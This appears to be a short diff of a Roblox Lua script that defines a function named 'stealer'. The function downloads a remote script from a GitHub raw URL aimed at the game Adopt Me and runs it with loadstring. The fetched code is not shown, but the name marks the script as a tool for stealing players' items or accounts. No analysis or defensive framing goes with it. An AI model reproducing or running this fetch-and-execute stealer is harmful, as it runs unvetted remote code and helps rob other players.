@@ -1,4 +1,3 @@
-lua
 local function stealer()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/kiroscrpts/adoptmescript/refs/heads/main/adoptmefunction.lua'))()
 end
